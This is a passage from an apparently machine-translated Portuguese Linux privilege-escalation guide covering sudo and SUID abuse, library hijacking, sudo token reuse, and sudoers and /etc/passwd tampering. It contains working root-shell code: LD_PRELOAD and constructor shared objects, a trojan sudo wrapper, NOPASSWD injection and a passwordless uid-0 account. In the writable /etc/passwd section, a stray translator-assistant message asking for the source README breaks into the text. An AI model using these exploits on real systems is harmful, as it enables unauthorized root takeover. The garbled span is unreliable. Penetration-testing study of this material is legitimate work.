interesting-groups-linux-pe/
{{#endref}}

### Área de transferência

Verifique se há algo interessante na área de transferência (se possível)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Política de Senhas
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Senhas conhecidas

Se você **souber alguma senha** do ambiente **tente fazer login como cada usuário** usando a senha.

### Su Brute

Se não se importa em gerar muito ruído e os binários `su` e `timeout` estiverem presentes na máquina, você pode tentar brute-force usuários usando [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) com o parâmetro `-a` também tenta brute-force usuários.

## Abusos do $PATH gravável

### $PATH

Se você descobrir que pode **escrever dentro de alguma pasta do $PATH**, pode ser capaz de escalar privilégios ao **criar uma backdoor dentro da pasta gravável** com o nome de algum comando que será executado por um usuário diferente (idealmente root) e que **não é carregado a partir de uma pasta que esteja antes** da sua pasta gravável no $PATH.

### SUDO and SUID

Você pode ter permissão para executar algum comando usando sudo ou eles podem ter o bit suid. Verifique usando:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Alguns **comandos inesperados permitem que você leia e/ou escreva arquivos ou até execute um comando.** Por exemplo:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

A configuração do Sudo pode permitir que um usuário execute um comando com os privilégios de outro usuário sem precisar conhecer a senha.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
Neste exemplo o usuário `demo` pode executar `vim` como `root`; agora é trivial obter um shell adicionando uma chave ssh no diretório `root` ou chamando `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Esta diretiva permite ao usuário **definir uma variável de ambiente** ao executar algo:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Este exemplo, **baseado na HTB machine Admirer**, foi **vulnerável** a **PYTHONPATH hijacking** para carregar uma biblioteca python arbitrária enquanto executava o script como root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV preserved via sudo env_keep → root shell

Se o sudoers preserva `BASH_ENV` (por exemplo, `Defaults env_keep+="ENV BASH_ENV"`), você pode aproveitar o comportamento de inicialização não interativo do Bash para executar código arbitrário como root ao invocar um comando permitido.

- Por que funciona: Para shells não interativos, o Bash avalia `$BASH_ENV` e carrega esse arquivo antes de executar o script alvo. Muitas regras do sudo permitem executar um script ou um wrapper de shell. Se `BASH_ENV` for preservado pelo sudo, seu arquivo é carregado com privilégios de root.

- Requisitos:
- Uma regra do sudo que você possa executar (qualquer target que invoque `/bin/bash` de forma não interativa, ou qualquer bash script).
- `BASH_ENV` presente em `env_keep` (verifique com `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Endurecimento:
- Remova `BASH_ENV` (e `ENV`) de `env_keep`, prefira `env_reset`.
- Evite wrappers de shell para comandos permitidos pelo sudo; use binários mínimos.
- Considere registro de I/O do sudo e alertas quando variáveis de ambiente preservadas forem usadas.

### Caminhos para contornar a execução do sudo

**Vá** ler outros arquivos ou use **symlinks**. Por exemplo no arquivo sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Se um **wildcard** for usado (\*), é ainda mais fácil:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Contramedidas**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary sem caminho do comando

Se a **permissão sudo** é dada para um único comando **sem especificar o caminho**: _hacker10 ALL= (root) less_ você pode explorá-lo alterando a variável PATH
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Esta técnica também pode ser usada se um binário **suid** **executa outro comando sem especificar o caminho para ele (sempre verifique com** _**strings**_ **o conteúdo de um binário SUID estranho)**).

[Payload examples to execute.](payloads-to-execute.md)

### Binário SUID com caminho do comando

Se o binário **suid** **executa outro comando especificando o caminho**, então, você pode tentar **exportar uma função** com o nome do comando que o arquivo suid está chamando.

Por exemplo, se um binário suid chama _**/usr/sbin/service apache2 start**_ você deve tentar criar a função e exportá-la:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Então, quando você chamar o binário suid, essa função será executada

### LD_PRELOAD & **LD_LIBRARY_PATH**

A variável de ambiente **LD_PRELOAD** é usada para especificar uma ou mais bibliotecas compartilhadas (.so files) a serem carregadas pelo loader antes de todas as outras, incluindo a biblioteca padrão C (`libc.so`). Esse processo é conhecido como pré-carregamento de uma biblioteca.

No entanto, para manter a segurança do sistema e evitar que esse recurso seja explorado, particularmente com executáveis **suid/sgid**, o sistema impõe certas condições:

- O loader ignora **LD_PRELOAD** para executáveis em que o ID de usuário real (_ruid_) não corresponde ao ID de usuário efetivo (_euid_).
- Para executáveis com suid/sgid, apenas bibliotecas em caminhos padrão que também sejam suid/sgid são pré-carregadas.

A escalada de privilégios pode ocorrer se você tiver a capacidade de executar comandos com `sudo` e a saída de `sudo -l` incluir a instrução **env_keep+=LD_PRELOAD**. Essa configuração permite que a variável de ambiente **LD_PRELOAD** persista e seja reconhecida mesmo quando comandos são executados com `sudo`, potencialmente levando à execução de código arbitrário com privilégios elevados.
```
Defaults        env_keep += LD_PRELOAD
```
Salvar como **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Então **compile-o** usando:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Finalmente, **escalate privileges** executando
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Um privesc similar pode ser abusado se o atacante controlar a variável de ambiente **LD_LIBRARY_PATH**, pois ele controla o caminho onde as bibliotecas serão procuradas.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Ao encontrar um binary com permissões **SUID** que pareça incomum, é uma boa prática verificar se ele está carregando corretamente arquivos **.so**. Isso pode ser verificado executando o seguinte comando:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Por exemplo, encontrar um erro como _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ sugere um potencial de exploração.

Para explorar isso, procede-se criando um arquivo C, por exemplo _"/path/to/.config/libcalc.c"_, contendo o seguinte código:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Este código, uma vez compilado e executado, tem como objetivo elevar privilégios manipulando permissões de arquivo e executando um shell com privilégios elevados.

Compile o arquivo C acima em um shared object (.so) com:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Finalmente, executar o binário SUID afetado deve acionar o exploit, permitindo um possível comprometimento do sistema.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Agora que encontramos um SUID binary que carrega uma library de uma pasta onde podemos escrever, vamos criar a library nessa pasta com o nome necessário:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Se você receber um erro como
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
isso significa que a biblioteca que você gerou precisa ter uma função chamada `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) é uma lista curada de binários Unix que podem ser explorados por um atacante para contornar restrições de segurança locais. [**GTFOArgs**](https://gtfoargs.github.io/) é o mesmo, mas para casos em que você **só pode injetar argumentos** em um comando.

O projeto reúne funções legítimas de binários Unix que podem ser abusadas para escapar de shells restritos, escalar ou manter privilégios elevados, transferir arquivos, spawnar bind e reverse shells, e facilitar outras tarefas de post-exploitation.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Se você conseguir acessar `sudo -l` pode usar a ferramenta [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) para verificar se ela encontra como explorar alguma regra do sudo.

### Reusing Sudo Tokens

Em casos onde você tem **sudo access** mas não a senha, você pode escalar privilégios esperando a execução de um comando sudo e então sequestar o token da sessão.

Requisitos para escalar privilégios:

- Você já tem um shell como o usuário "_sampleuser_"
- "_sampleuser_" **usou `sudo`** para executar algo nos **últimos 15 minutos** (por padrão essa é a duração do token do sudo que nos permite usar `sudo` sem inserir qualquer senha)
- `cat /proc/sys/kernel/yama/ptrace_scope` é 0
- `gdb` está acessível (você pode fazer upload dele)

(Você pode habilitar temporariamente `ptrace_scope` com `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` ou permanentemente modificando `/etc/sysctl.d/10-ptrace.conf` e definindo `kernel.yama.ptrace_scope = 0`)

Se todos esses requisitos forem atendidos, **você pode escalar privilégios usando:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- O **primeiro exploit** (`exploit.sh`) criará o binário `activate_sudo_token` em _/tmp_. Você pode usá-lo para **ativar o token do sudo na sua sessão** (você não obterá automaticamente um shell root, execute `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- O **segundo exploit** (`exploit_v2.sh`) criará um shell sh em _/tmp_ **de propriedade do root com setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- O **third exploit** (`exploit_v3.sh`) vai **criar um sudoers file** que torna os **sudo tokens eternos e permite que todos os usuários usem sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Se você tiver **permissões de escrita** na pasta ou em qualquer um dos arquivos criados dentro dela, você pode usar o binário [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) para **criar um sudo token para um usuário e PID**.\
Por exemplo, se você puder sobrescrever o arquivo _/var/run/sudo/ts/sampleuser_ e tiver um shell como esse usuário com PID 1234, você pode **obter privilégios sudo** sem precisar saber a senha, executando:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

O arquivo `/etc/sudoers` e os arquivos dentro de `/etc/sudoers.d` configuram quem pode usar `sudo` e como. Esses arquivos **por padrão só podem ser lidos pelo usuário root e pelo grupo root**.\
**Se** você conseguir **ler** este arquivo, poderá **obter algumas informações interessantes**, e se você conseguir **escrever** em qualquer arquivo, será capaz de **escalar privilégios**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Se você pode escrever, pode abusar dessa permissão.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Outra forma de abusar dessas permissões:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Existem algumas alternativas ao binário `sudo`, como `doas` do OpenBSD; lembre-se de verificar sua configuração em `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Se você sabe que um **usuário geralmente conecta-se a uma máquina e usa `sudo`** para escalar privilégios e você obteve um shell nesse contexto de usuário, você pode **criar um novo executável sudo** que irá executar seu código como root e depois o comando do usuário. Em seguida, **modifique o $PATH** do contexto do usuário (por exemplo adicionando o novo caminho em .bash_profile) para que, quando o usuário executar sudo, seu executável sudo seja executado.

Observe que se o usuário usa um shell diferente (não bash) você precisará modificar outros arquivos para adicionar o novo caminho. Por exemplo[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) modifica `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Você pode encontrar outro exemplo em [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Ou executando algo como:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Biblioteca Compartilhada

### ld.so

O arquivo `/etc/ld.so.conf` indica **de onde vêm os arquivos de configuração carregados**. Normalmente, este arquivo contém o seguinte caminho: `include /etc/ld.so.conf.d/*.conf`

Isso significa que os arquivos de configuração de `/etc/ld.so.conf.d/*.conf` serão lidos. Esses arquivos de configuração **apontam para outras pastas** onde **bibliotecas** serão **procuradas**. Por exemplo, o conteúdo de `/etc/ld.so.conf.d/libc.conf` é `/usr/local/lib`. **Isso significa que o sistema irá procurar por bibliotecas dentro de `/usr/local/lib`**.

Se por algum motivo **um usuário tiver permissões de escrita** em qualquer um dos caminhos indicados: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, qualquer arquivo dentro de `/etc/ld.so.conf.d/` ou qualquer pasta referenciada dentro dos arquivos em `/etc/ld.so.conf.d/*.conf` ele pode ser capaz de escalate privileges.\
Dê uma olhada em **como explorar essa má configuração** na página a seguir:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Ao copiar a lib para `/var/tmp/flag15/`, ela será usada pelo programa neste local conforme especificado na variável `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Em seguida, crie uma biblioteca maliciosa em `/var/tmp` com `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capacidades

As capacidades do Linux fornecem um **subconjunto dos privilégios root disponíveis a um processo**. Isso efetivamente divide os **privilégios do root em unidades menores e distintas**. Cada uma dessas unidades pode então ser concedida independentemente a processos. Dessa forma o conjunto completo de privilégios é reduzido, diminuindo os riscos de exploração.\
Leia a seguinte página para **aprender mais sobre capacidades e como abusar delas**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Permissões de diretório

Em um diretório, o **bit de "execute"** implica que o usuário afetado pode "cd" para dentro da pasta.\
O **bit "read"** implica que o usuário pode **listar** os **arquivos**, e o **bit "write"** implica que o usuário pode **deletar** e **criar** novos **arquivos**.

## ACLs

Listas de Controle de Acesso (ACLs) representam a camada secundária de permissões discricionárias, capazes de **sobrescrever as permissões tradicionais ugo/rwx**. Essas permissões aumentam o controle sobre o acesso a um arquivo ou diretório ao permitir ou negar direitos a usuários específicos que não são os proprietários nem fazem parte do grupo. Esse nível de **granularidade garante um gerenciamento de acesso mais preciso**. Further details can be found [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Dar** ao usuário "kali" permissões de leitura e escrita sobre um arquivo:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Obter** arquivos com ACLs específicas do sistema:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Sessões de shell abertas

Em **versões antigas** você pode **hijack** alguma sessão de **shell** de outro usuário (**root**).\
Nas **versões mais recentes** você só poderá **conectar-se** a screen sessions do **seu próprio usuário**. No entanto, você pode encontrar **informações interessantes dentro da sessão**.

### screen sessions hijacking

**Listar screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**Anexar a uma sessão**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

Isso era um problema com **versões antigas do tmux**. Não consegui hijack a sessão do tmux (v2.1) criada por root quando executando como non-privileged user.

**Listar sessões do tmux**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Anexar a uma sessão**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box do HTB** for an example.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

All SSL and SSH keys generated on Debian based systems (Ubuntu, Kubuntu, etc) between September 2006 and May 13th, 2008 may be affected by this bug.\
This bug is caused when creating a new ssh key in those OS, as **only 32,768 variations were possible**. This means that all the possibilities can be calculated and **having the ssh public key you can search for the corresponding private key**. You can find the calculated possibilities here: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** Especifica se password authentication é permitida. O padrão é `no`.
- **PubkeyAuthentication:** Especifica se public key authentication é permitida. O padrão é `yes`.
- **PermitEmptyPasswords**: Quando password authentication está permitida, especifica se o servidor permite login em contas com senhas vazias. O padrão é `no`.

### PermitRootLogin

Especifica se root pode fazer login via ssh, o padrão é `no`. Valores possíveis:

- `yes`: root pode fazer login usando password e private key
- `without-password` or `prohibit-password`: root só pode fazer login com private key
- `forced-commands-only`: Root pode fazer login apenas usando private key e se as opções de comandos estiverem especificadas
- `no` : não

### AuthorizedKeysFile

Especifica os arquivos que contêm os public keys que podem ser usados para user authentication. Pode conter tokens como `%h`, que serão substituídos pelo diretório home. **Você pode indicar caminhos absolutos** (começando em `/`) ou **caminhos relativos a partir do home do usuário**. Por exemplo:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Essa configuração indicará que, se você tentar fazer login com a chave **private** do usuário "**testusername**", o ssh vai comparar a public key da sua key com as que estão localizadas em `/home/testusername/.ssh/authorized_keys` e `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding permite que você **use suas SSH keys locais em vez de deixar keys** (without passphrases!) no seu servidor. Assim, você poderá **jump** via ssh **to a host** e, a partir daí, **jump to another** host **using** a **key** localizada no seu **initial host**.

Você precisa definir esta opção em `$HOME/.ssh.config` desta forma:
```
Host example.com
ForwardAgent yes
```
Observe que se `Host` for `*`, toda vez que o usuário se conectar a uma máquina diferente, essa máquina poderá acessar as chaves (o que é um problema de segurança).

O arquivo `/etc/ssh_config` pode **sobrescrever** essas **opções** e permitir ou negar essa configuração.\
O arquivo `/etc/sshd_config` pode **permitir** ou **negar** o ssh-agent forwarding com a diretiva `AllowAgentForwarding` (padrão: allow).

Se você descobrir que o Forward Agent está configurado em um ambiente, leia a página a seguir, pois **você pode conseguir abusar disso para escalar privilégios**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Arquivos Interessantes

### Arquivos de profile

O arquivo `/etc/profile` e os arquivos em `/etc/profile.d/` são **scripts que são executados quando um usuário inicia um novo shell**. Portanto, se você puder **escrever ou modificar qualquer um deles, poderá escalar privilégios**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Se for encontrado algum script de perfil estranho, você deve verificá-lo em busca de **detalhes sensíveis**.

### Arquivos Passwd/Shadow

Dependendo do sistema operacional, os arquivos `/etc/passwd` e `/etc/shadow` podem estar usando um nome diferente ou pode haver um backup. Portanto, recomenda-se **encontrar todos eles** e **verificar se você consegue lê-los** para ver **se há hashes** dentro dos arquivos:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
Em algumas ocasiões, você pode encontrar **password hashes** dentro do arquivo `/etc/passwd` (ou equivalente)
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Gravável /etc/passwd

Primeiro, gere uma senha com um dos seguintes comandos.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Preciso do conteúdo de src/linux-hardening/privilege-escalation/README.md para traduzir. Você pode colar o texto aqui?

Sobre "Then add the user `hacker` and add the generated password.": quer que eu
- gere uma senha forte e inclua no README traduzido (em texto claro), e adicione um trecho com os comandos shell (useradd, passwd) a serem inseridos no arquivo?  
ou
- apenas um snippet de exemplo com comandos, sem colocar a senha em claro?

Diga qual opção prefere e cole o conteúdo do README.md.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
E.g: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Você agora pode usar o comando `su` com `hacker:hacker`

Alternativamente, você pode usar as linhas a seguir para adicionar um usuário fictício sem senha.\
AVISO: isso pode degradar a segurança atual da máquina.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
NOTA: Em plataformas BSD `/etc/passwd` está localizado em `/etc/pwd.db` e `/etc/master.passwd`, também o `/etc/shadow` é renomeado para `/etc/spwd.db`.

Você deve verificar se pode **escrever em alguns arquivos sensíveis**. Por exemplo, você consegue escrever em algum **arquivo de configuração de serviço**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Por exemplo, se a máquina estiver executando um servidor **tomcat** e você puder **modificar o arquivo de configuração do serviço Tomcat dentro de /etc/systemd/,** então você pode modificar as linhas:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Seu backdoor será executado na próxima vez que tomcat for iniciado.

### Verificar Diretórios

Os seguintes diretórios podem conter backups ou informações interessantes: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Provavelmente você não conseguirá ler o último, mas tente)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Localização Estranha/Arquivos Owned
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Arquivos modificados nos últimos minutos
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Arquivos DB do Sqlite
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml arquivos
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Arquivos ocultos
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Script/Binaries em PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Arquivos web**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Cópias de segurança**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Arquivos conhecidos que contêm senhas

Leia o código do [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), ele procura por **vários arquivos possíveis que podem conter senhas**.\
**Outra ferramenta interessante** que você pode usar para isso é: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) que é uma aplicação de código aberto usada para recuperar muitas senhas armazenadas em um computador local para Windows, Linux & Mac.

### Logs

Se você conseguir ler logs, pode conseguir encontrar **informações interessantes/confidenciais neles**. Quanto mais estranho o log, mais interessante ele provavelmente será (provavelmente).\
Além disso, alguns **mal** configurados (backdoored?) **audit logs** podem permitir que você **registre senhas** dentro dos audit logs como explicado neste post: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Para **ler logs, o grupo** [**adm**](interesting-groups-linux-pe/index.html#adm-group) será muito útil.

### Arquivos de shell
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Você também deve verificar arquivos que contenham a palavra "**password**" no **nome** ou dentro do **conteúdo**, e também checar IPs e e-mails dentro de logs, ou regexps de hashes.\
Não vou listar aqui como fazer tudo isso, mas se estiver interessado você pode conferir as últimas verificações que [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) realiza.

## Arquivos graváveis

### Python library hijacking

